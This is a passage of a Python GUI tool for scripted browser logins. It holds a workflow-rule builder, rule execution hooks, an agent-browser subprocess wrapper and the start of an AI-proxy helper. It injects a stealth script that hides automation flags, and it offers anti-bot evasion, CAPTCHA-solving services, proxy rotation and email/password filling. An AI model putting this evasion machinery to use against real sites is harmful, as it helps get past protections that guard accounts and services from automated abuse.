                Object.defineProperty(navigator, 'webdriver', {get: () => undefined});
                window.chrome = { runtime: {} };
                Object.defineProperty(navigator, 'plugins', {get: () => [1, 2, 3]});
            """)
        except Exception:
            pass
            
    # 8. Session Store
    sess_store = actions.get("session_store", {})
    if sess_store.get("enabled"):
        t = sess_store.get("type", "Cookies")
        print_action(f"[Action] Storing session data ({t})...")
        if t == "Cookies":
            print_action(f"[Session Cookies]: {len(browser.get_cookies())} cookies active.")
            
    # 9. Session Cookies Manipulation
    sess_cookies = actions.get("session_cookies", {})
    if sess_cookies.get("enabled") and sess_cookies.get("code"):
        code = sess_cookies["code"]
        print_action("[Action] Running Cookie/Headers manipulation script...")
        try:
            browser.execute_script(code)
        except Exception as e:
            print_action(f"{Fore.RED}[Session Cookies Error] {e}{Style.RESET_ALL}")
            
    # 10. Session Refresh
    sess_ref = actions.get("session_refresh", {})
    if sess_ref.get("enabled"):
        t = sess_ref.get("target", "Refresh Page")
        print_action(f"[Action] Navigation Action: {t}")
        if t == "Refresh Page":
            browser.refresh()
        else:
            sel = sess_ref.get("selector", "")
            if sel:
                el = find_el(sel)
                if el:
                    browser.switch_to.frame(el)
                    
    # 11. Logic Set Element Value
    log_set = actions.get("logic_set", {})
    if log_set.get("enabled") and log_set.get("selector"):
        sel = log_set["selector"]
        val = log_set.get("value", "")
        resolved = val.replace("{email}", email).replace("{password}", password)
        print_action(f"[Action] Logic: Setting value of '{sel}' to '{resolved}'...")
        el = find_el(sel)
        if el:
            try:
                browser.execute_script("arguments[0].value = arguments[1];", el, resolved)
            except Exception:
                pass
                
    # 12. Logic Dispatch Event
    log_disp = actions.get("logic_dispatch", {})
    if log_disp.get("enabled") and log_disp.get("selector"):
        sel = log_disp["selector"]
        ev = log_disp.get("event", "click")
        print_action(f"[Action] Logic: Dispatching event '{ev}' on '{sel}'...")
        el = find_el(sel)
        if el:
            try:
                browser.execute_script("arguments[0].dispatchEvent(new Event(arguments[1], {bubbles: true}));", el, ev)
            except Exception:
                pass
                
    # 13. Logic Javascript
    log_js = actions.get("logic_js", {})
    if log_js.get("enabled") and log_js.get("code"):
        code = log_js["code"]
        print_action("[Action] Logic: Evaluating custom JavaScript...")
        try:
            res = browser.execute_script(code)
            if res:
                print_action(f"[JS Return] {res}")
        except Exception as e:
            print_action(f"{Fore.RED}[JS Execution Error] {e}{Style.RESET_ALL}")


def trigger_lifecycle_hook(hook_name, context):
    """
    Scans the fields sequence for any workflow rules matching the timing hook
    and executes their actions.
    """
    global fields_sequence
    browser = context.get("browser")
    email = context.get("email", "")
    password = context.get("password", "")
    capture_settings = context.get("capture_settings", {})
    
    if not browser:
        return
        
    for field in fields_sequence:
        if field.get("type") == "workflow_rule":
            timing = field.get("timing", {})
            hook_timing = timing.get(hook_name, {})
            if hook_timing.get("enabled"):
                # Evaluate conditional matches
                
                # Check Specific interval/URL pattern matching
                if "pattern" in hook_timing and hook_timing["pattern"]:
                    pattern = hook_timing["pattern"]
                    current_url = browser.current_url
                    if not re.search(pattern, current_url):
                        continue
                        
                # Check After capture matches
                if hook_name == "after_capture":
                    sel = hook_timing.get("selector", "")
                    expected = hook_timing.get("value", "")
                    if sel:
                        try:
                            el = _safe_find_element(browser, By.CSS_SELECTOR, sel, timeout=5)
                            if el:
                                val = el.text or el.get_attribute("value") or el.get_attribute("textContent")
                                if expected not in val:
                                    continue
                            else:
                                continue
                        except Exception:
                            continue
                            
                # Check After evaluation of custom IF/ELSE condition
                if hook_name == "after_condition":
                    if_val = hook_timing.get("if_val", "")
                    if if_val:
                        try:
                            res = browser.execute_script(f"return Boolean({if_val});")
                            if not res:
                                continue
                        except Exception:
                            continue
                            
                # Condition matched! Execute actions configured for this rule
                print_action(f"{Fore.CYAN}[Lifecycle Hook] '{hook_name}' triggered a rule match!{Style.RESET_ALL}")
                execute_rule_actions(field, browser, email, password, capture_settings)


def open_workflow_builder(existing_rule=None):
    """
    Spawns a highly polished side-by-side modal dialog for designing complex automation rules.
    Left Column: ACTIONS TO DEFINE
    Right Column: EXECUTION TIMING
    """
    dialog = tk.Toplevel(window)
    dialog.title("Advanced Workflow Rule Builder")
    dialog.geometry("1100x820")
    dialog.configure(bg=colors["bg"])
    dialog.grab_set()
    
    # Header Title
    lbl_title = tk.Label(
        dialog,
        text="⚙️ ADVANCED WORKFLOW RULE STUDIO",
        font=("Inter", 12, "bold"),
        fg=colors["accent"],
        bg=colors["bg"]
    )
    lbl_title.pack(pady=(15, 10))
    
    # Scrollable Container Frame
    container = tk.Frame(dialog, bg=colors["bg"])
    container.pack(fill="both", expand=True, padx=20, pady=5)
    
    canvas = tk.Canvas(container, borderwidth=0, highlightthickness=0, bg=colors["bg"])
    scrollbar = ttk.Scrollbar(container, orient="vertical", command=canvas.yview)
    scroll_frm = tk.Frame(canvas, bg=colors["bg"])
    
    scroll_frm.bind(
        "<Configure>",
        lambda e: canvas.configure(
            scrollregion=canvas.bbox("all")
        )
    )
    canvas_window = canvas.create_window((0, 0), window=scroll_frm, anchor="nw")
    canvas.configure(yscrollcommand=scrollbar.set)
    canvas.bind('<Configure>', lambda event: canvas.itemconfig(canvas_window, width=event.width))
    
    def _on_wheel(event):
        canvas.yview_scroll(int(-1*(event.delta/120)), "units")
    canvas.bind('<Enter>', lambda e: canvas.bind_all('<MouseWheel>', _on_wheel))
    canvas.bind('<Leave>', lambda e: canvas.unbind_all('<MouseWheel>'))
    
    canvas.pack(side="left", fill="both", expand=True)
    scrollbar.pack(side="right", fill="y")
    
    # Grid Layout for 2 Columns
    scroll_frm.columnconfigure(0, weight=1, uniform="col")
    scroll_frm.columnconfigure(1, weight=1, uniform="col")
    
    left_column = tk.Frame(scroll_frm, bg=colors["bg"])
    left_column.grid(row=0, column=0, sticky="nsew", padx=10)
    
    right_column = tk.Frame(scroll_frm, bg=colors["bg"])
    right_column.grid(row=0, column=1, sticky="nsew", padx=10)
    
    # Initialize variables with existing or default
    rule_data = existing_rule if existing_rule else {}
    rule_actions = rule_data.get("actions", {})
    rule_timing = rule_data.get("timing", {})
    
    vars_actions = {
        "basic_click_enabled": tk.BooleanVar(value=rule_actions.get("basic_click", {}).get("enabled", False)),
        "basic_click_type": tk.StringVar(value=rule_actions.get("basic_click", {}).get("type", "Left")),
        "basic_click_selector": tk.StringVar(value=rule_actions.get("basic_click", {}).get("selector", "")),
        
        "basic_capture_enabled": tk.BooleanVar(value=rule_actions.get("basic_capture", {}).get("enabled", False)),
        "basic_capture_mode": tk.StringVar(value=rule_actions.get("basic_capture", {}).get("mode", "Text Content")),
        "basic_capture_selector": tk.StringVar(value=rule_actions.get("basic_capture", {}).get("selector", "")),
        
        "basic_type_enabled": tk.BooleanVar(value=rule_actions.get("basic_type", {}).get("enabled", False)),
        "basic_type_selector": tk.StringVar(value=rule_actions.get("basic_type", {}).get("selector", "")),
        "basic_type_value": tk.StringVar(value=rule_actions.get("basic_type", {}).get("value", "")),
        
        "basic_wait_enabled": tk.BooleanVar(value=rule_actions.get("basic_wait", {}).get("enabled", False)),
        "basic_wait_ms": tk.IntVar(value=rule_actions.get("basic_wait", {}).get("ms", 500)),
        
        "security_captcha_enabled": tk.BooleanVar(value=rule_actions.get("security_captcha", {}).get("enabled", False)),
        "security_captcha_service": tk.StringVar(value=rule_actions.get("security_captcha", {}).get("service", "ai_captcha")),
        "security_captcha_key": tk.StringVar(value=rule_actions.get("security_captcha", {}).get("api_key", "")),
        
        "security_fingerprint_enabled": tk.BooleanVar(value=rule_actions.get("security_fingerprint", {}).get("enabled", False)),
        "security_antibot_enabled": tk.BooleanVar(value=rule_actions.get("security_antibot", {}).get("enabled", False)),
        
        "session_store_enabled": tk.BooleanVar(value=rule_actions.get("session_store", {}).get("enabled", False)),
        "session_store_type": tk.StringVar(value=rule_actions.get("session_store", {}).get("type", "Cookies")),
        
        "session_cookies_enabled": tk.BooleanVar(value=rule_actions.get("session_cookies", {}).get("enabled", False)),
        
        "session_refresh_enabled": tk.BooleanVar(value=rule_actions.get("session_refresh", {}).get("enabled", False)),
        "session_refresh_target": tk.StringVar(value=rule_actions.get("session_refresh", {}).get("target", "Refresh Page")),
        "session_refresh_selector": tk.StringVar(value=rule_actions.get("session_refresh", {}).get("selector", "")),
        
        "logic_set_enabled": tk.BooleanVar(value=rule_actions.get("logic_set", {}).get("enabled", False)),
        "logic_set_selector": tk.StringVar(value=rule_actions.get("logic_set", {}).get("selector", "")),
        "logic_set_value": tk.StringVar(value=rule_actions.get("logic_set", {}).get("value", "")),
        
        "logic_dispatch_enabled": tk.BooleanVar(value=rule_actions.get("logic_dispatch", {}).get("enabled", False)),
        "logic_dispatch_event": tk.StringVar(value=rule_actions.get("logic_dispatch", {}).get("event", "click")),
        "logic_dispatch_selector": tk.StringVar(value=rule_actions.get("logic_dispatch", {}).get("selector", "")),
        
        "logic_js_enabled": tk.BooleanVar(value=rule_actions.get("logic_js", {}).get("enabled", False)),
    }
    
    vars_timing = {
        "before_interval_enabled": tk.BooleanVar(value=rule_timing.get("before_interval", {}).get("enabled", False)),
        "before_interval_pattern": tk.StringVar(value=rule_timing.get("before_interval", {}).get("pattern", "")),
        
        "before_login_enabled": tk.BooleanVar(value=rule_timing.get("before_login", {}).get("enabled", False)),
        "before_login_type": tk.StringVar(value=rule_timing.get("before_login", {}).get("type", "Username field")),
        
        "before_redirect_enabled": tk.BooleanVar(value=rule_timing.get("before_redirect", {}).get("enabled", False)),
        "before_captcha_enabled": tk.BooleanVar(value=rule_timing.get("before_captcha", {}).get("enabled", False)),
        "before_proxy_enabled": tk.BooleanVar(value=rule_timing.get("before_proxy", {}).get("enabled", False)),
        "before_cookies_enabled": tk.BooleanVar(value=rule_timing.get("before_cookies", {}).get("enabled", False)),
        "before_lifecycle_enabled": tk.BooleanVar(value=rule_timing.get("before_lifecycle", {}).get("enabled", False)),
        "before_form_enabled": tk.BooleanVar(value=rule_timing.get("before_form", {}).get("enabled", False)),
        "before_error_enabled": tk.BooleanVar(value=rule_timing.get("before_error", {}).get("enabled", False)),
        
        "after_interval_enabled": tk.BooleanVar(value=rule_timing.get("after_interval", {}).get("enabled", False)),
        "after_interval_pattern": tk.StringVar(value=rule_timing.get("after_interval", {}).get("pattern", "")),
        
        "after_redirect_enabled": tk.BooleanVar(value=rule_timing.get("after_redirect", {}).get("enabled", False)),
        "after_lifecycle_enabled": tk.BooleanVar(value=rule_timing.get("after_lifecycle", {}).get("enabled", False)),
        "after_form_enabled": tk.BooleanVar(value=rule_timing.get("after_form", {}).get("enabled", False)),
        
        "after_capture_enabled": tk.BooleanVar(value=rule_timing.get("after_capture", {}).get("enabled", False)),
        "after_capture_selector": tk.StringVar(value=rule_timing.get("after_capture", {}).get("selector", "")),
        "after_capture_value": tk.StringVar(value=rule_timing.get("after_capture", {}).get("value", "")),
        
        "after_result_enabled": tk.BooleanVar(value=rule_timing.get("after_result", {}).get("enabled", False)),
        "after_solve_enabled": tk.BooleanVar(value=rule_timing.get("after_solve", {}).get("enabled", False)),
        "after_rotate_enabled": tk.BooleanVar(value=rule_timing.get("after_rotate", {}).get("enabled", False)),
        "after_error_enabled": tk.BooleanVar(value=rule_timing.get("after_error", {}).get("enabled", False)),
        
        "after_condition_enabled": tk.BooleanVar(value=rule_timing.get("after_condition", {}).get("enabled", False)),
        "after_condition_if": tk.StringVar(value=rule_timing.get("after_condition", {}).get("if_val", "")),
        "after_condition_else": tk.StringVar(value=rule_timing.get("after_condition", {}).get("else_val", "")),
    }

    # Helper for adding sub-grid rows to label frames
    def make_row(parent, var_enabled, text):
        row = tk.Frame(parent, bg=colors["bg"])
        row.pack(fill="x", pady=4, anchor="w")
        chk = ttk.Checkbutton(row, variable=var_enabled, text=text)
        chk.pack(side="left", padx=5)
        return row

    # --- LEFT COLUMN: ACTIONS ---
    
    # 1. Basic Actions
    lf_basic = tk.LabelFrame(left_column, text=" 📝 [BASIC ACTIONS] ", bg=colors["bg"], fg=colors["accent"], font=("Inter", 9, "bold"), padx=10, pady=8)
    lf_basic.pack(fill="x", pady=5)
    
    # Click
    r1 = make_row(lf_basic, vars_actions["basic_click_enabled"], "Click Action")
    combo_click = ttk.Combobox(r1, textvariable=vars_actions["basic_click_type"], values=["Left", "Right", "Double Left", "Press Enter", "Press Tab"], width=12, state="readonly")
    combo_click.pack(side="left", padx=2)
    ent_click = ttk.Entry(r1, textvariable=vars_actions["basic_click_selector"], width=20)
    ent_click.pack(side="left", padx=2)
    CreateToolTip(ent_click, "CSS Selector to target for clicking / key press")
    
    # Capture
    r2 = make_row(lf_basic, vars_actions["basic_capture_enabled"], "Capture Data")
    combo_cap = ttk.Combobox(r2, textvariable=vars_actions["basic_capture_mode"], values=["Full HTML", "Text Content", "Input Value", "Attribute Value"], width=12, state="readonly")
    combo_cap.pack(side="left", padx=2)
    ent_cap = ttk.Entry(r2, textvariable=vars_actions["basic_capture_selector"], width=20)
    ent_cap.pack(side="left", padx=2)
    CreateToolTip(ent_cap, "CSS Selector to target for capturing value")
    
    # Type
    r3 = make_row(lf_basic, vars_actions["basic_type_enabled"], "Type Text")
    ent_type_sel = ttk.Entry(r3, textvariable=vars_actions["basic_type_selector"], width=14)
    ent_type_sel.pack(side="left", padx=2)
    CreateToolTip(ent_type_sel, "Target CSS Selector")
    ent_type_val = ttk.Entry(r3, textvariable=vars_actions["basic_type_value"], width=16)
    ent_type_val.pack(side="left", padx=2)
    CreateToolTip(ent_type_val, "Value to type (supports {email}, {password})")
    
    # Wait
    r4 = make_row(lf_basic, vars_actions["basic_wait_enabled"], "Wait Delay")
    sp_wait = ttk.Spinbox(r4, textvariable=vars_actions["basic_wait_ms"], from_=100, to=10000, increment=100, width=8)
    sp_wait.pack(side="left", padx=2)
    tk.Label(r4, text="ms", fg=colors["fg_sub"], bg=colors["bg"]).pack(side="left", padx=2)
    
    # 2. Security Actions
    lf_sec = tk.LabelFrame(left_column, text=" 🛡️ [SECURITY & ANTI-BOT ACTIONS] ", bg=colors["bg"], fg=colors["accent"], font=("Inter", 9, "bold"), padx=10, pady=8)
    lf_sec.pack(fill="x", pady=5)
    
    r5 = make_row(lf_sec, vars_actions["security_captcha_enabled"], "Solve CAPTCHA")
    combo_svc = ttk.Combobox(r5, textvariable=vars_actions["security_captcha_service"], values=["ai_captcha", "twocaptcha", "anticaptcha"], width=12, state="readonly")
    combo_svc.pack(side="left", padx=2)
    ent_svc_key = ttk.Entry(r5, textvariable=vars_actions["security_captcha_key"], width=20)
    ent_svc_key.pack(side="left", padx=2)
    CreateToolTip(ent_svc_key, "CAPTCHA solver API Key / configurations override")
    
    make_row(lf_sec, vars_actions["security_fingerprint_enabled"], "Validate Fingerprint Anti-Detection")
    make_row(lf_sec, vars_actions["security_antibot_enabled"], "Inject Stealth Anti-Detection Script")
    
    # 3. Session Navigation Actions
    lf_sess = tk.LabelFrame(left_column, text=" 🌐 [NAVIGATION & SESSION ACTIONS] ", bg=colors["bg"], fg=colors["accent"], font=("Inter", 9, "bold"), padx=10, pady=8)
    lf_sess.pack(fill="x", pady=5)
    
    r8 = make_row(lf_sess, vars_actions["session_store_enabled"], "Store Session Data")
    combo_store = ttk.Combobox(r8, textvariable=vars_actions["session_store_type"], values=["Cookies", "LocalStorage", "SessionStorage"], width=15, state="readonly")
    combo_store.pack(side="left", padx=2)
    
    r9 = make_row(lf_sess, vars_actions["session_cookies_enabled"], "Manipulate Cookies/Headers")
    txt_cookies = tk.Text(lf_sess, height=3, bg=colors["surface"], fg=colors["fg"], insertbackground=colors["fg"], font=("Consolas", 9), bd=1, relief="solid")
    txt_cookies.pack(fill="x", padx=25, pady=2)
    txt_cookies.insert("1.0", rule_actions.get("session_cookies", {}).get("code", ""))
    
    r10 = make_row(lf_sess, vars_actions["session_refresh_enabled"], "Refresh Tab/iFrame")
    combo_ref = ttk.Combobox(r10, textvariable=vars_actions["session_refresh_target"], values=["Refresh Page", "Switch to iFrame"], width=14, state="readonly")
    combo_ref.pack(side="left", padx=2)
    ent_ref_sel = ttk.Entry(r10, textvariable=vars_actions["session_refresh_selector"], width=16)
    ent_ref_sel.pack(side="left", padx=2)
    CreateToolTip(ent_ref_sel, "iFrame CSS Selector / index if switching frame")
    
    # 4. Form handling & Logic
    lf_log = tk.LabelFrame(left_column, text=" 🧪 [FORM HANDLING & LOGIC ACTIONS] ", bg=colors["bg"], fg=colors["accent"], font=("Inter", 9, "bold"), padx=10, pady=8)
    lf_log.pack(fill="x", pady=5)
    
    r11 = make_row(lf_log, vars_actions["logic_set_enabled"], "Set Element Value")
    ent_log_sel = ttk.Entry(r11, textvariable=vars_actions["logic_set_selector"], width=16)
    ent_log_sel.pack(side="left", padx=2)
    ent_log_val = ttk.Entry(r11, textvariable=vars_actions["logic_set_value"], width=16)
    ent_log_val.pack(side="left", padx=2)
    
    r12 = make_row(lf_log, vars_actions["logic_dispatch_enabled"], "Dispatch Custom Event")
    combo_log_ev = ttk.Combobox(r12, textvariable=vars_actions["logic_dispatch_event"], values=["click", "change", "focus", "blur", "submit"], width=10, state="readonly")
    combo_log_ev.pack(side="left", padx=2)
    ent_log_disp_sel = ttk.Entry(r12, textvariable=vars_actions["logic_dispatch_selector"], width=18)
    ent_log_disp_sel.pack(side="left", padx=2)
    
    r13 = make_row(lf_log, vars_actions["logic_js_enabled"], "Evaluate Javascript Code")
    txt_js = tk.Text(lf_log, height=3, bg=colors["surface"], fg=colors["fg"], insertbackground=colors["fg"], font=("Consolas", 9), bd=1, relief="solid")
    txt_js.pack(fill="x", padx=25, pady=2)
    txt_js.insert("1.0", rule_actions.get("logic_js", {}).get("code", ""))
    
    # --- RIGHT COLUMN: TIMING & CONDITIONS ---
    
    # BEFORE (TRIGGER CONDITIONS)
    lf_before = tk.LabelFrame(right_column, text=" ⏳ BEFORE (TRIGGER CONDITIONS) ", bg=colors["bg"], fg=colors["accent"], font=("Inter", 9, "bold"), padx=10, pady=8)
    lf_before.pack(fill="x", pady=5)
    
    rb1 = make_row(lf_before, vars_timing["before_interval_enabled"], "Specific Interval/URL Match")
    ent_b1 = ttk.Entry(rb1, textvariable=vars_timing["before_interval_pattern"], width=22)
    ent_b1.pack(side="left", padx=2)
    CreateToolTip(ent_b1, "URL pattern (Regex) or execution sequence index")
    
    rb2 = make_row(lf_before, vars_timing["before_login_enabled"], "Login Field Interaction")
    combo_b2 = ttk.Combobox(rb2, textvariable=vars_timing["before_login_type"], values=["Username field", "Password field", "Login click"], width=16, state="readonly")
    combo_b2.pack(side="left", padx=2)
    
    make_row(lf_before, vars_timing["before_redirect_enabled"], "Before Redirect (Detected target redirect)")
    make_row(lf_before, vars_timing["before_captcha_enabled"], "Before Solve CAPTCHA")
    make_row(lf_before, vars_timing["before_proxy_enabled"], "Before Rotate Proxy")
    make_row(lf_before, vars_timing["before_cookies_enabled"], "Before Injecting Cookies / Stealth Sessions")
    make_row(lf_before, vars_timing["before_lifecycle_enabled"], "Page/Tab Lifecycle loading starts")
    make_row(lf_before, vars_timing["before_form_enabled"], "General Form elements detection begins")
    make_row(lf_before, vars_timing["before_error_enabled"], "Error / Exception occurs in execution")
    
    # AFTER (TRIGGER CONDITIONS)
    lf_after = tk.LabelFrame(right_column, text=" 🔔 AFTER (TRIGGER CONDITIONS) ", bg=colors["bg"], fg=colors["accent"], font=("Inter", 9, "bold"), padx=10, pady=8)
    lf_after.pack(fill="x", pady=5)
    
    ra1 = make_row(lf_after, vars_timing["after_interval_enabled"], "Specific Interval/URL Match")
    ent_a1 = ttk.Entry(ra1, textvariable=vars_timing["after_interval_pattern"], width=22)
    ent_a1.pack(side="left", padx=2)
    
    make_row(lf_after, vars_timing["after_redirect_enabled"], "After Redirect (Valid target loaded)")
    make_row(lf_after, vars_timing["after_lifecycle_enabled"], "Page/Element Lifecycle completed")
    make_row(lf_after, vars_timing["after_form_enabled"], "Form Interaction completed")
    
    ra2 = make_row(lf_after, vars_timing["after_capture_enabled"], "After Capturing Selector Content")
    ent_a2_sel = ttk.Entry(ra2, textvariable=vars_timing["after_capture_selector"], width=12)
    ra2_val_chk = ra2.winfo_children()[0] # get checkbox
    ent_a2_sel.pack(side="left", padx=2)
    ent_a2_val = ttk.Entry(ra2, textvariable=vars_timing["after_capture_value"], width=12)
    ent_a2_val.pack(side="left", padx=2)
    CreateToolTip(ent_a2_val, "Value pattern to match to fire action")
    
    make_row(lf_after, vars_timing["after_result_enabled"], "Result Action triggered")
    make_row(lf_after, vars_timing["after_solve_enabled"], "After Solve CAPTCHA")
    make_row(lf_after, vars_timing["after_rotate_enabled"], "After Rotate Proxy")
    make_row(lf_after, vars_timing["after_error_enabled"], "After Error / Retrying verification")
    
    ra3 = make_row(lf_after, vars_timing["after_condition_enabled"], "After Evaluating custom IF/ELSE condition")
    ent_a3_if = ttk.Entry(ra3, textvariable=vars_timing["after_condition_if"], width=12)
    ent_a3_if.pack(side="left", padx=2)
    ent_a3_else = ttk.Entry(ra3, textvariable=vars_timing["after_condition_else"], width=12)
    ent_a3_else.pack(side="left", padx=2)
    CreateToolTip(ent_a3_if, "Javascript IF expression to evaluate")
    CreateToolTip(ent_a3_else, "Javascript ELSE branch variable")
    
    # --- FOOTER CONTROLS ---
    frm_btns = tk.Frame(dialog, bg=colors["bg"])
    frm_btns.pack(fill="x", side="bottom", pady=15, padx=20)
    
    def on_cancel():
        dialog.destroy()
        
    def on_save():
        # Validate that at least one action is enabled
        actions_dict = {
            "basic_click": {"enabled": vars_actions["basic_click_enabled"].get(), "type": vars_actions["basic_click_type"].get(), "selector": vars_actions["basic_click_selector"].get()},
            "basic_capture": {"enabled": vars_actions["basic_capture_enabled"].get(), "mode": vars_actions["basic_capture_mode"].get(), "selector": vars_actions["basic_capture_selector"].get()},
            "basic_type": {"enabled": vars_actions["basic_type_enabled"].get(), "selector": vars_actions["basic_type_selector"].get(), "value": vars_actions["basic_type_value"].get()},
            "basic_wait": {"enabled": vars_actions["basic_wait_enabled"].get(), "ms": vars_actions["basic_wait_ms"].get()},
            "security_captcha": {"enabled": vars_actions["security_captcha_enabled"].get(), "service": vars_actions["security_captcha_service"].get(), "api_key": vars_actions["security_captcha_key"].get()},
            "security_fingerprint": {"enabled": vars_actions["security_fingerprint_enabled"].get()},
            "security_antibot": {"enabled": vars_actions["security_antibot_enabled"].get()},
            "session_store": {"enabled": vars_actions["session_store_enabled"].get(), "type": vars_actions["session_store_type"].get()},
            "session_cookies": {"enabled": vars_actions["session_cookies_enabled"].get(), "code": txt_cookies.get("1.0", "end-1c")},
            "session_refresh": {"enabled": vars_actions["session_refresh_enabled"].get(), "target": vars_actions["session_refresh_target"].get(), "selector": vars_actions["session_refresh_selector"].get()},
            "logic_set": {"enabled": vars_actions["logic_set_enabled"].get(), "selector": vars_actions["logic_set_selector"].get(), "value": vars_actions["logic_set_value"].get()},
            "logic_dispatch": {"enabled": vars_actions["logic_dispatch_enabled"].get(), "event": vars_actions["logic_dispatch_event"].get(), "selector": vars_actions["logic_dispatch_selector"].get()},
            "logic_js": {"enabled": vars_actions["logic_js_enabled"].get(), "code": txt_js.get("1.0", "end-1c")},
        }
        
        timing_dict = {
            "before_interval": {"enabled": vars_timing["before_interval_enabled"].get(), "pattern": vars_timing["before_interval_pattern"].get()},
            "before_login": {"enabled": vars_timing["before_login_enabled"].get(), "type": vars_timing["before_login_type"].get()},
            "before_redirect": {"enabled": vars_timing["before_redirect_enabled"].get()},
            "before_captcha": {"enabled": vars_timing["before_captcha_enabled"].get()},
            "before_proxy": {"enabled": vars_timing["before_proxy_enabled"].get()},
            "before_cookies": {"enabled": vars_timing["before_cookies_enabled"].get()},
            "before_lifecycle": {"enabled": vars_timing["before_lifecycle_enabled"].get()},
            "before_form": {"enabled": vars_timing["before_form_enabled"].get()},
            "before_error": {"enabled": vars_timing["before_error_enabled"].get()},
            
            "after_interval": {"enabled": vars_timing["after_interval_enabled"].get(), "pattern": vars_timing["after_interval_pattern"].get()},
            "after_redirect": {"enabled": vars_timing["after_redirect_enabled"].get()},
            "after_lifecycle": {"enabled": vars_timing["after_lifecycle_enabled"].get()},
            "after_form": {"enabled": vars_timing["after_form_enabled"].get()},
            "after_capture": {"enabled": vars_timing["after_capture_enabled"].get(), "selector": vars_timing["after_capture_selector"].get(), "value": vars_timing["after_capture_value"].get()},
            "after_result": {"enabled": vars_timing["after_result_enabled"].get()},
            "after_solve": {"enabled": vars_timing["after_solve_enabled"].get()},
            "after_rotate": {"enabled": vars_timing["after_rotate_enabled"].get()},
            "after_error": {"enabled": vars_timing["after_error_enabled"].get()},
            "after_condition": {"enabled": vars_timing["after_condition_enabled"].get(), "if_val": vars_timing["after_condition_if"].get(), "else_val": vars_timing["after_condition_else"].get()},
        }
        
        # Build descriptive label
        label_parts = []
        for act_name, act_val in actions_dict.items():
            if act_val["enabled"]:
                simple_name = act_name.replace("basic_", "").replace("security_", "").replace("session_", "").replace("logic_", "").capitalize()
                if "selector" in act_val and act_val["selector"]:
                    label_parts.append(f"{simple_name} '{act_val['selector']}'")
                else:
                    label_parts.append(simple_name)
                    
        timing_parts = []
        for time_name, time_val in timing_dict.items():
            if time_val["enabled"]:
                timing_parts.append(time_name.replace("before_", "Before ").replace("after_", "After ").capitalize())
                
        actions_str = ", ".join(label_parts) if label_parts else "No Actions"
        timing_str = ", ".join(timing_parts) if timing_parts else "Sequential"
        
        rule_lbl = f"⚙️ Rule: {actions_str} ({timing_str})"
        
        if existing_rule:
            # Modify existing rule in-place
            existing_rule["label"] = rule_lbl
            existing_rule["actions"] = actions_dict
            existing_rule["timing"] = timing_dict
        else:
            # Add new rule
            import time
            rule_id = f"workflow_rule_{int(time.time())}"
            new_rule = {
                "id": rule_id,
                "type": "workflow_rule",
                "label": rule_lbl,
                "var_name": rule_id,
                "actions": actions_dict,
                "timing": timing_dict
            }
            fields_sequence.append(new_rule)
            
        field_manager.rebuild_ui()
        save_settings()
        dialog.destroy()
        
    btn_cancel = tk.Button(
        frm_btns,
        text="Cancel Changes",
        font=("Inter", 9, "bold"),
        bg="#e53e3e",
        fg="#ffffff",
        relief="flat",
        borderwidth=0,
        padx=15,
        pady=8,
        command=on_cancel
    )
    btn_cancel.pack(side="left")
    
    btn_save = tk.Button(
        frm_btns,
        text="Save Workflow Rule & Close",
        font=("Inter", 9, "bold"),
        bg=colors["accent"],
        fg=colors["bg"],
        relief="flat",
        borderwidth=0,
        padx=15,
        pady=8,
        command=on_save
    )
    btn_save.pack(side="right")
    
    # Apply initial colors recursively
    update_widget_colors(dialog, colors)


def _run_agent_browser(args):
    """Safely execute npx agent-browser commands inside a subprocess on Windows 11 using pwsh."""
    import subprocess
    
    # Clean up and normalise command args (remove redundant prefixes)
    clean_args = []
    skip_next = False
    for i, arg in enumerate(args):
        if skip_next:
            skip_next = False
            continue
        if arg == "npx":
            if i + 1 < len(args) and args[i+1] == "-y":
                skip_next = True
            continue
        if arg == "agent-browser":
            continue
        clean_args.append(arg)
        
    # If the clean_args is just ["install"] or ["close", "--all"], we don't need batch partition
    if clean_args and clean_args[0] in ["install", "close"]:
        cmd_str = " ".join("'" + a.replace("'", "''") + "'" for a in clean_args)
        pwsh_cmd = f"npx -y agent-browser {cmd_str}"
    else:
        # Parse out global options and command/batch args
        global_flags = []
        cmd_args = []
        
        i = 0
        while i < len(clean_args):
            arg = clean_args[i]
            if arg in {"--session", "--timeout", "--cdp", "--args", "--extension"}:
                # These take a value
                if i + 1 < len(clean_args):
                    global_flags.append(arg)
                    global_flags.append(clean_args[i+1])
                    i += 2
                else:
                    global_flags.append(arg)
                    i += 1
            elif arg in {"--headed", "--headless", "--json", "--full"}:
                # These are standalone global flags
                global_flags.append(arg)
                i += 1
            else:
                # This is a command or command argument
                cmd_args.append(arg)
                i += 1
                
        # Global flags go directly after 'agent-browser'
        global_str = " ".join("'" + f.replace("'", "''") + "'" for f in global_flags)
        
        # Determine if 'batch' was requested
        is_batch = "batch" in cmd_args
        actual_cmds = [c for c in cmd_args if c != "batch"]
        
        batch_prefix = "batch " if is_batch else ""
        cmds_str = " ".join("'" + c.replace("'", "''") + "'" for c in actual_cmds)
        
        pwsh_cmd = f"npx -y agent-browser {global_str} {batch_prefix}{cmds_str}"
        
    # Determine if we can try the fast offline path --no-install
    can_use_offline = (clean_args and clean_args[0] != "install")
    
    if can_use_offline:
        pwsh_cmd_cached = pwsh_cmd.replace("npx -y", "npx --no-install")
        full_args_cached = ["pwsh", "-NoProfile", "-Command", pwsh_cmd_cached]
        
        result = subprocess.run(
            full_args_cached,
            capture_output=True,
            text=True,
            encoding="utf-8",
            errors="replace"
        )
        if result.returncode == 0:
            return result.stdout, result.stderr, result.returncode
            
    full_args = ["pwsh", "-NoProfile", "-Command", pwsh_cmd]
    
    result = subprocess.run(
        full_args,
        capture_output=True,
        text=True,
        encoding="utf-8",
        errors="replace"
    )
    return result.stdout, result.stderr, result.returncode


def _global_ask_ai_agent(prompt):
    """Global thread-safe helper that sends prompt payloads directly to OpenRouter or Claude proxy."""
    import json
    import requests
    
    # 1. Read Claude proxy settings from GUI/Settings
    claude_proxy_enabled = False
    claude_proxy_url_val = ""
    claude_proxy_model_val = "gemini-3-flash"
    try:
        claude_proxy_enabled = bool(var_claude_proxy_enabled.get())
        claude_proxy_url_val = var_claude_proxy_url.get().strip()
        claude_proxy_model_val = var_claude_proxy_model.get().strip()
    except Exception:
        pass
        
    if claude_proxy_enabled and claude_proxy_url_val:
        try:
            url = claude_proxy_url_val
            if not url.endswith("/chat/completions") and not url.endswith("/v1/chat/completions"):
                url = url.rstrip("/") + "/v1/chat/completions"
            
            headers = {"Content-Type": "application/json"}
            payload = {
                "model": claude_proxy_model_val or "claude-3-5-sonnet",
                "messages": [{"role": "user", "content": prompt}],
                "temperature": 0.1
            }
